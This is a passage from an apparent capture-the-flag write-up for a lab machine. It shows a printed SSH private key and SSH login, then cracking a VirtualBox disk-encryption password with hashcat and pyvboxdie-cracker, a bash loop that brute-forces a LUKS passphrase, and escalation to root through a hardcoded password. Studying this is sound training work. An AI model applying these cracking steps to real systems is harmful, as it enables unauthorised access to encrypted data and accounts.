2bDBVUUFTcjRWYmNpaTM3ZGpaVzFrKzVzRDNhanpxQVBncW9RcnRWNVp4ODh5Nms3ZDd4K2ZEVXh5VXBTNUt3OW5Ydm9tY1ZUMWNTRHd4aEc2QmlzS1dDY1Y1RXZqL2t4ZHZqZ3p4QjNtSlFFcVQya3ZNOGpqazVTSndCajV5dFdIQlZsYXhmMUNobjFUcTNtbnRlTjVHcmxxYXQ0Z3c5ajMzcFR3cmlZT3Z1RHAxQ2J3N1NocURoYWswTWt1eGRxaGRXRE5LYzFHL3M1TEdpR3dCdlBxT1M4TTAyOHBBSWQ4YzNtK0VyMXFUSEdLZXZJdnpseHZGTjYzZy83QklYaFRocis0cXlrVWFRMTVEU2VVd2lNUkhUVlhpcVlwc3JkMzVDUFRVOUl2cVN0aGZsbFhnTnl5R0djSFpvUkhLaE14SW41aGZNU1QzdGMza0JpWUh1R3haOEp2QzFCYUtrSHpiVVV6Tjg2YVczN2hSWVdhTnFnZ2JDMXVrTU5CZFZHbXhGaVRPd3pqRkh0ZFdxZ2RETnpPUVlwM3ZETmhSOXFDZUlpMVM3YmxFM1lYZkw5T3A0QlI3bW9mRTFNWWluYS9hUElhNTBvS3cxcHU3YjNqNGNRci9CYm1PeURKM2I5YlhwT0xpV0N3RjlEcHlMbDhkWWZvcm1uVThDaFIyWVU5MWtBcXhkZnJvRUpRM1Nzdm92TU40TGhraktBYW42YTRuWFoxQW8zK0NldytERGhYUVhFQ24zbGNYTklyQkJmS2ZkZGFBWTE0WEM5cDBTZEttRFJBdjBodDRPTk0rT1pIbkdMdGlRZFRpc0c4VVB2ODRFSDFoczFYNXh3YXNCb0hBSGRMQnRJSnVIRDhjYU1ORlkxQmROaXk3cURLU2ZtTWU4MTArVXB5UkZJMUVLRndlZGN2YUZqSTNMRzhIajUyZTVmTVltMGU3ckNrRXN0SGlLRTU2SDlkaU8xRVRNa2JOTFA3N0svNDd3eW0rZ3lQS0JnL2pVODMyelEwSGJyNGllVk1wY3d4b0tpRkFDZlRiVzc5dVJybEtibDJldE42NFU2NkhtU3NteFV2TDF5OHlzbXVNMW5CTW5FWUVRdmg1eXBoOGdpTmovZnRENlVlYms0K1pWZW54cncremlPNHVrWnZFeWlab25Ec1VydExSUEcrRU5mSXVIMG1tajNibFdUeSszQzV4QVZSSHhhR0dIUm1xUTBSVDVONUZaZEEyVjVZRno1aDAvdDBoTmJLUldxMlljWjNPL0hDemQ0cmRyalFSY1g4WGFzdXZRU2NwSW5rei9LVFQ5VkJTZUppdm55OElVdUNnMWRsVUFiYTM3QTVWa0hjK3BEeVJzQXdxZWlSTHJoTTRrdkdHUTZyc3JmbzdpcEFkVVRtQytqaFlqQkRGcWVjMXl4UW5QN3FQUU5rcGdUekhSS2wrN0hCbWc0SU5qeDNQYzJRK25SZ2ZSeXV1eWxyYkFEK1QzcUcyU2FwbDFZTkdjdElyRFVLbW5keWlXTEdJVE1aV0lrcDZyZ2VVQ0lvckQ1c1JiRXgxZ0lVUzkzNEp5L1NDQVZ2c284c1hKeFl6WmRwYnBIK0ZqdDRZYlFCaVpGdWZCZTFkU29KdzFFQmhKUWpYUjZmWjNxcGdXcCs4dzZFVWprbzM0aEJXOFpmaFhTMitzTk9aZERXelQ4d0JSMTJWRTQ0OFdLVzBNM0xyN01kWXl3WkY3Q3I2alR0UXZFNW5CdTlOUHFDZ1dmZTRRcE5vSW45d1VWSVV3citEbStIK3U1cWxKZk1RUGIxRkFSNXFST2owQmQ3RjRoK1VvUUtUbE5FcUN6bFdXMGJZM1l6dWRUa1k4VTN3cTRmbjlEQUlwWGtvZVRNNERpMndhUjBZYXZVaUJMcHBuMXp0a3JIaElYSityWmRqYXdEZ01reVdzb0ZYakZhR2hZTjRvdlBHaXU4NVU5VmU2bndmUjVSVGxDUVhaMXpLVzlrNk9JMHNGTHRrU1F0QXRrUFpSVWl1QXM4SDNkNTQ3VkZlTVpJNFRJcVJyYk9CeDB1R2c4eXRtYzZ3NFpZNFlJSVprd0NLVXBRejJQZmdibmNJOXhSMHBwMDRKVkQ4R2Vuczg4M3JGUjJFQnhTUFZxSjdVSmxESWp4ZDRIU21rK2ZPS3dnS2FYNFFDTGNiVWxLalFKSWlXZFFLQ1pOUW5aeGJNWW5LM0NHU2FucmdWNERhc0pPSThNaVZ1VDUxd3I4VFlEL2VaTFErOCt6Q3pmMnF1VGNWNEtnSlByaUFJQWJNL0ovZWxZSTJpcmVYbXppbVp0N2MydWdpYzhZVVM3eGtocTRYbUlPVGx3RDEzZWk4ZkhVNStYdVBzS1IyUWxVM1Ayd1pFb0UrRnBqVExxa2k4NlBBcU82QjZiWTVtNmJHTERpZ0lVUWtNVExqOWZ4dFEwVDgxNC9oSk4vS2tGSFRFWEduWnVwQkpWT0s3Q2hxazZJVmVCZVh3eU1tUkw3TmhNajBYOG1JR2g2YVJmVFpZQVZUczBkWnVJSTVOUURqTGRMb3Jkb3ZQL0lxdjhWam0wOG9FaEhtZUszYzI4eVBJb3VQTlRsL1lMZ1M3NlBnbU84dGtZZTR1Z3JKK2dKMzhHc2NzQm91REl3bk82OG1ZV1o5c1F5cG85U0tvbE51TjJ5VCtFQWE1eEcwOUc3aXZaS0hZVWQybU0xQlcxaHkveVBJcUZEcXR4ZTgyMWp4Vm85UVltS2krOUUvanUraXdkYVNIVDJFSWZzMk1CQUFlVzVCcEIvS0MvbGJGRzljWmpnMERURW1zUzIrczYwR3pNdz09IiwiaXYiOiJiNWE1ZWJhMTQ1MzVkYTZiYTIwZDNkNGI5ZjdiZGFjYyIsInNhbHQiOiJkMDgwNzAzM2JkNDNlYWZkNmVlNDdkMzQ5ZDQzODA0MzY1OWMyNTBhOWQ3OTc3NGJiMmEwYzU1OWFhNjA4ZDNiNjFkNDVkZGViNTU0NTc4ZTNlYTQwODJmNzBmYmVjYWM1ZWM2NWE4NjlmMzI0MjU4NjUxMGZkMmYyZTBkYTkzZmM1MDEzOTk2OTQ5MWNkNDU2MzA2MDExZjY5NWFkYzJkYjBlMTMwNDM2YWViZjJmMzRmMDBkZmFkZDJjYWZiZWZjYzg0MmUzNzk4MmI5NmNmNDhkZDc4YjczYjYxNGY0YzljOTIwYzllY2NlOWRjY2Y2NmM3YmNiYzQ5YWFiM2NmYzI5N2UxMGY2NDcwY2I2YjY2NzAxYTFhNjhlZDBiYWQ5OWZiMDk0NDQyZmUzYjEwNDEyN2ZjMTk2Y2FhYmZhY2I3YjU5MTc4NjE1OTZiZjU0NWM3NDkwNjZiNGJlZmNiYTg2Zjg1NmM5M2U2YTI5MzZjNjM2NGQ3NGEyMjQ2Nzc5ZTJmYjEyYmMwYzUwYjE5NmFkOTI0Nzc0NDU4YjUyZjQxYmU5NTUyM2ExMDljMjMzZWM2NzFiNmIyNWFhYjJlNWU1ZjVkNDJhMTVlYmNiMDNmZjE5ODFiYmJiODdkMGFkM2M1NDRlMzUyN2QwOWU3YmI5YjA5ZjI1NjYzYzY3YSIsIml0ZXJhdGlvbnMiOjk5OX0=
-----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----

```

It’s putting spaces where newlines should be, but I’ll clean that up in vim. I’ll get the two headers on their own lines, and then run `:s/ /[Ctrl v][Return]/g` to replace all the remaining spaces on the current line with newlines.

### SSH

With the key, I can SSH as john:

```

oxdf@hacky$ chmod 600 ~/keys/moderators-john
oxdf@hacky$ ssh -i ~/keys/moderators-john john@10.10.11.173
Last login: Mon Jul 11 17:09:18 2022 from 10.10.14.6
john@moderators:~$

```

## Shell as root

### Enumeration

#### sudo

Trying to run `sudo` as john just prompts for a password:

```

john@moderators:~$ sudo -l
[sudo] password for john:

```

Since I was able to access john via an SSH key, I don’t know it, and can’t continue here.

#### john’s Homedir - scripts

john’s home directory has `scripts` and `stuff` folders.

The `scripts` folder has a bunch of administrative looking scripts:

```

john@moderators:~/scripts$ ls
addauser.py   exam                  genpasswd.py                   index.php.bak      logtail.pl             python_template.py  tmux.conf                           zabbix_ext_ssl_cert_template.xml
check-url.py  examdir.py            getcolors.py                   lcdproc_client.py  pihole-blacklists.txt  sms.conf            vra7-bulk-export-import-cleaner.py  zabbix_trap_receiver.pl
_config.yml   file-locking-demo.pl  guacamole.min.js.mic-fix-v1.1  linux_oom.c        port-checker.pl        sms.rb              zabbix_cert_check_simple.xml

```

I’ll do some basic `grep` for things like “pass” and “token”, but nothing interesting comes out.

#### john’s Chat Logs

The `stuff` directory has two directories:

```

john@moderators:~/stuff$ ls
exp  VBOX

```

`exp` has chat log backups:

```

john@moderators:~/stuff/exp$ ls
2021-09-15.exp  2021-09-17.exp  2021-09-18.exp  2021-09-19.exp  2021-09-20.exp  2021-09-23.exp

```

For example, `2021-09-15.exp`:

```

4/7/21, 16:20 - Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.
9/15/21, 23:24 - CARL BENJAMIN: Hello john
9/15/21, 23:25 - JOHN MILLER: Hello sir
9/15/21, 23:25 - JOHN MILLER: I got your email
9/15/21, 23:25 - JOHN MILLER: Sorry i couldnt  reapond sooner
9/15/21, 23:25 - CARL BENJAMIN: That's Okay
9/15/21, 23:25 - CARL BENJAMIN: I just wanted to if everythings fine
9/15/21, 23:26 - JOHN MILLER: Yes sir
9/15/21, 23:26 - JOHN MILLER: I inform lexi about the upcomming sessions
9/15/21, 23:26 - JOHN MILLER: Has said she was done with the front end
9/15/21, 23:26 - CARL BENJAMIN: Good
9/15/21, 23:27 - CARL BENJAMIN: Tell her to finish the rest of the work as soon as possible
9/15/21, 23:27 - CARL BENJAMIN: We have to be live before this Thursday
9/15/21, 23:27 - JOHN MILLER: Surw sir i will inform her

```

There’s not much that interesting in there.

#### john’s Virtual Box Image

The `saved` folder has a file `2019.vdi`, and the `VBOX` folder has `2019-08-01.vbox`. This is a VirtualBox machine configuration and the associated hard drive file. I’ll download both to my local machine using `scp`.

The `.vbox` file contains all the settings for the virtual machine. The important part for now is the `<HardDisks>`:

```

      <HardDisks>
        <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="F:/2019.vdi" format="VDI" type="Normal">
          <Property name="CRYPT/KeyId" value="Moderator 1"/>
          <Property name="CRYPT/KeyStore" value="U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&#13;&#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&#13;&#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&#13;&#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&#13;&#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&#13;&#10;gwC6MrGLZFhl1g=="/>
        </HardDisk>
        <HardDisk uuid="{5999a8f0-e31d-4d4e-937d-173eb6ba8881}" location="Ubuntu.vdi" format="VDI" type="Normal"/>
      </HardDisks>

```

It shows two, `2019.vdi` and `Ubuntu.vdi`. I don’t have the second one, but I do have the first one. `2019.vdi` also has some `Property` tags with `CRYPT/KeyId` and `CRYPT/KeyStore`. These are related to VirtualBox’s encryption of hard drives:

![image-20220711180059927](https://0xdfimages.gitlab.io/img/image-20220711180059927.png)

### Access 2019.vdi

#### Crack VirtualBox Encryption

Some Googling will turn up [pyvboxdie-cracker](https://github.com/axcheron/pyvboxdie-cracker), a tool to break the hashes in `vbox` files. I’ll give it the file with `rockyou` and it breaks:

```

oxdf@hacky$ time python3 /opt/pyvboxdie-cracker/pyvboxdie-cracker.py -v 2019-08-01.vbox -d /usr/share/wordlists/rockyou.txt
Starting pyvboxdie-cracker...

[*] Encrypted drive found :  F:/2019.vdi
[*] KeyStore information...
        Algorithm = AES-XTS256-PLAIN64
        Hash = PBKDF2-SHA256
        Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f

[*] Starting bruteforce...
        40 password tested...

[*] Password Found = computer

real    0m31.424s
user    0m31.165s
sys     0m0.258s

```

Alternatively, I can also use `hashcat`. VBox encryption was adding in [this pull request](https://github.com/hashcat/hashcat/pull/2884). I’ll use the `virtualbox2hashcat.py` script to generate a hash and save it to a file:

```

$ python3 /opt/hashcat-6.2.6/tools/virtualbox2hashcat.py 
usage: virtualbox2hashcat.py [-h] --vbox VBOX
virtualbox2hashcat.py: error: the following arguments are required: --vbox

$ python3 /opt/hashcat-6.2.6/tools/virtualbox2hashcat.py --vbox 2019-08-01.vbox | tee 2019-08-01.vbox.hash
$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f

```

Now `hashcat` will crack it in a couple minutes:

```

$ hashcat 2019-08-01.vbox.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS) | Full-Disk Encryption (FDE)
...[snip]...
$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f:computer
...[snip]...

```

#### Create Virtual Machine
*For this next step to work, it’s important that the VirtualBox extension pack is installed. Without that, it won’t be able to recognize the encryption and interact with the encrypted drive.*

I use VirtualBox in my daily routine, and have a bunch of VMs already. I’ll create a folder called `mod` on my host next to those VMs, and copy both files into it.

```

$ ls 
2019-08-01.vbox  2019.vdi

```

The `location` in `2019-08-01.vbox` is `F:/2019.vdi`, I’ll update that to just `2019.vdi`, which will look in the current directory.

Then, in VirtualBox, I’ll select Machine > Add and find the `vbox` file. I’ll open the settings, and the system is there. Under Storage, there’s a warning next to Ubuntu.vdi:

![image-20220711180809377](https://0xdfimages.gitlab.io/img/image-20220711180809377.png)

I’ll remove that drive. I need to give the VM something that’s bootable. I’ll add a CDROM drive and a iso that I have around (a Parrot Security ISO, which will be nice because it has some tools already on it):

![image-20220711181833107](https://0xdfimages.gitlab.io/img/image-20220711181833107.png)

I’ll exit the settings and boot the VM. On boot, it asks for a password for Moderator1:

![image-20220711180946373](https://0xdfimages.gitlab.io/img/image-20220711180946373.png)

On entering “computer”, it proceeds to boot, and asks how I want to boot:

![image-20220711181855813](https://0xdfimages.gitlab.io/img/image-20220711181855813.png)

I’ll click “Try / Install”, and I’m at a Parrot desktop:

![image-20220711181946401](https://0xdfimages.gitlab.io/img/image-20220711181946401.png)

#### LUKS

I’ll open a terminal, and check drives at `/dev/sd*`. There’s only one:

![image-20220711182009801](https://0xdfimages.gitlab.io/img/image-20220711182009801.png)

Unfortunately, when I try to mount the drive, it fails:

```

┌─[user@parrot]─[~]
└──╼ $sudo mount /dev/sda /mnt
mount: /mnt: unknown filesystem type 'crypto_LUKS'.

```

#### Hashcat Fail

[This article](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html) talks about how to grab just the start of the disk image file and send it to Hashcat. I’ll do that, but it doesn’t work:

```

$ /opt/hashcat-6.2.5/hashcat.bin -m 14600 disk
hashcat (v6.2.5) starting
...[snip]...
Hashfile 'disk': Invalid LUKS version
No hashes loaded.

```

The newer version of LUKS are not yet implemented in Hashcat.

#### Local Crack

[This article](https://sleeplessbeastie.eu/2019/03/27/how-to-test-luks-passphrase/) shows how to test a LUKS passphrase. I’ll write a short bash loop to check for passwords and exit if it succeeds:

```

#!/bin/bash

for w in $(cat $1); do
  echo -ne "\r\033[KTesting $w";
  printf "$w" | cryptsetup luksOpen --test-passphrase /dev/sda 2>/dev/null && \
    echo "Found password: $w" && \
    break
done

```

It will take a wordlist as an argument, and then loop over it. The `\r` resets the cursor to the start of the line, and `\033[K` clears the line. Then it prints that it’s testing the current word so that I can watch progress.

For each word, it sends the password into `cryptsetup luksOpen --test-passphrase` and if that succeeds (`&&`) it prints and breaks the loop.

After I decompress `rockyout.txt`, this finds the password very quickly:

```

┌─[root@parrot]─[~]
└──╼ #gunzip /usr/share/wordlists/rockyou.txt.gz 
┌─[root@parrot]─[~]
└──╼ #time bash crack.sh /usr/share/wordlists/rockyou.txt
Testing abc123Found password: abc123

real	0m22.415s
user	1m1.171s
sys	0m3.093s

```

#### Load Drive

To mount a LUKS drive, first open it and give it a name:

```

┌─[root@parrot]─[~]
└──╼ #cryptsetup luksOpen /dev/sda 0xdf_vol
Enter passphrase for /dev/sda: 

```

When it prompts for the password, I’ll give “abc123”. Now I’ll mount that on `/mnt`:

```

┌─[root@parrot]─[~]
└──╼ #mount /dev/mapper/0xdf_vol /mnt

```

### Find Password

The mounted volume has a `scripts` directory:

```

┌─[root@parrot]─[~]
└──╼ #ls /mnt/
lost+found  scripts

```

There are 52 different scripts across four folders:

```

┌─[root@parrot]─[/mnt/scripts]
└──╼ #ls
all-in-one  installation_scripts  miscellaneous  python-scripts
┌─[root@parrot]─[/mnt/scripts]
└──╼ #find . -type f | wc -l
52

```

The `installation_scripts` seem like they might have some root creds, but they all just have a root check at the top.

Doing some basic `grep` for “pass” turns up something interesting:

```

┌─[root@parrot]─[/mnt/scripts]
└──╼ #grep -r pass .
./installation_scripts/install_flask.sh:        proxy_pass http://unix:/home/$username/public_html/$username.sock;
./installation_scripts/install_jenkins.sh:    echo -e "\n\nJenkins installation is complete.\nAccess the Jenkins interface from http://$local_ip:8080\nThe default password is located at '/var/lib/jenkins/secrets/initialAdminPassword'\n\nExiting..."
./installation_scripts/install_flask_nginx.sh:        proxy_pass http://unix:/home/$username/public_html/$username.sock;
./installation_scripts/install_nagios.sh:    echo -e "\n\n######################\n   Enter the password for the Nagios Admin - 'nagiosadmin'\n######################\n\n"
./installation_scripts/install_nagios.sh:    htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin
./miscellaneous/passgen.sh:# Script to generate random passwords using openssl                   #
./miscellaneous/passgen.sh:# Usage: ./passgen.sh <number of passwords> <length of passwords>     #
./miscellaneous/passgen.sh:pass_num=$1
./miscellaneous/passgen.sh:[ -n "$pass_num" ] || pass_num=1
./miscellaneous/passgen.sh:pass_len=$2
./miscellaneous/passgen.sh:[ -n "$pass_len" ] || pass_len=16
./miscellaneous/passgen.sh:for i in $(seq 1 $pass_num);
./miscellaneous/passgen.sh:      openssl rand -base64 48 | cut -c1-${pass_len};
./all-in-one/vm_user_env_setup.sh:    PASSWORD=password$i
./all-in-one/vm_user_env_setup.sh:    sudo adduser --quiet --disabled-password --gecos "" $USERNAME
./all-in-one/vm_user_env_setup.sh:    echo "$USERNAME:$PASSWORD" | sudo chpasswd
./all-in-one/mount_azure_fileshare.sh:sudo mount -t cifs //$STORAGE_NAME.file.core.windows.net/$FILESHARE_NAME $MOUNT_POINT -o vers=3.0,username=$STORAGE_NAME,password=$STORAGE_KEY,dir_mode=0777,file_mode=0777
./all-in-one/mount_azure_fileshare.sh://$STORAGE_NAME.file.core.windows.net/$FILESHARE_NAME $MOUNT_POINT cifs vers=3.0,username=$STORAGE_NAME,password=$STORAGE_KEY,dir_mode=0777,file_mode=0777
./all-in-one/distro_update.sh:passwd='$_THE_best_Sysadmin_Ever_'
./all-in-one/vmss_deploy_with_public_ip.py:        "--public-ip-per-vm --admin-username {admin_id} --admin-password {admin_pw}".format(
./all-in-one/jupyter_configure.sh:    echo "Enter password for Jupyter notebook"
./all-in-one/jupyter_configure.sh:    python -c "import IPython;print(IPython.lib.passwd())" > SHA1_FILE
./all-in-one/jupyter_configure.sh:	sed -i "s|#c.NotebookApp.password = ''|c.NotebookApp.password = '$SHA1'|" $JUPYTER_CONF

```

In `all-in-one/distro_update.sh`, there’s a password:

```

./all-in-one/distro_update.sh:passwd='$_THE_best_Sysadmin_Ever_'

```

### sudo

This password does not work for root, but it does work for john:

```

john@moderators:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on moderators:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on moderators:
    (root) ALL

```

And john can run any command as root with a password. So to get a shell:

```

john@moderators:~$ sudo -i
root@moderators:~#

```

And `root.txt`:

```

root@moderators:~# cat root.txt
8d07ac43************************

```